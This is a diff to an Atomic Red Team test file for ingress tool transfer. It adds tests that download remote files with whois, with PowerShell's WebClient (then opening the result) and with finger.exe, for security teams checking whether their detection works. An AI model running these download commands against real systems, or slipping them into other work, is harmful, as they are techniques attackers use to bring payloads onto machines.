@@ -304,7 +304,7 @@ atomic_tests:
     Uses the Windows Defender to download a file from the internet (must have version 4.18.2007.8-0, 4.18.2007.9, or 4.18.2009.9 installed).
     The input arguments "remote_file" and "local_path" can be used to specify the download URL and the name of the output file.
     By default, the test downloads the Atomic Red Team license file to the temp directory.
-    
+
     More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
   supported_platforms:
   - windows
@@ -335,3 +335,92 @@ atomic_tests:
       del #{local_path} >nul 2>&1
       del %temp%\MpCmdRun.log >nul 2>&1
     name: command_prompt
+- name: whois file download
+  auto_generated_guid: c99a829f-0bb8-4187-b2c6-d47d1df74cab
+  description: |
+    Download a remote file using the whois utility
+
+  supported_platforms:
+  - linux
+  - macos
+
+  input_arguments:
+    remote_host:
+      description: Remote hostname or IP address
+      type: String
+      default: localhost
+    remote_port:
+      description: Remote port to connect to
+      type: Integer
+      default: 8443
+    output_file:
+      description: Path of file to save output to
+      type: Path
+      default: /tmp/T1105.whois.out
+    query:
+      description: Query to send to remote server
+      type: String
+      default: "Hello from Atomic Red Team test T1105"
+    timeout:
+      description: Timeout period before ending process (seconds)
+      type: Integer
+      default: 1
+
+  dependencies:
+    - description: |
+        The whois and timeout commands must be present
+      prereq_command: |
+        which whois && which timeout
+      get_prereq_command: |
+        echo "Please install timeout and the whois package"
+
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} "#{query}" > #{output_file}
+    cleanup_command: |
+      rm -f #{output_file}
+
+- name: File Download via PowerShell
+  auto_generated_guid: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2
+  description: |
+    Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_remote_file:
+      description: File to download
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
+    output_file:
+      description: File to write to
+      type: string
+      default: LICENSE.txt
+  executor:
+    command: |
+      (New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}
+    name: powershell
+
+- name: File download with finger.exe on Windows
+  auto_generated_guid: 5f507e45-8411-4f99-84e7-e38530c45d01
+  description: |
+    Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
+    Because this is being tested on the localhost, you should not be expecting a successful connection
+    https://www.exploit-db.com/exploits/48815
+    https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
+  
+  supported_platforms:
+  - windows
+
+  input_arguments:
+    remote_host:
+      description: Remote hostname or IP address
+      type: String
+      default: localhost
+
+  executor:
+    name: command_prompt
+    command: |
+      finger base64_filedata@#{remote_host}
+      
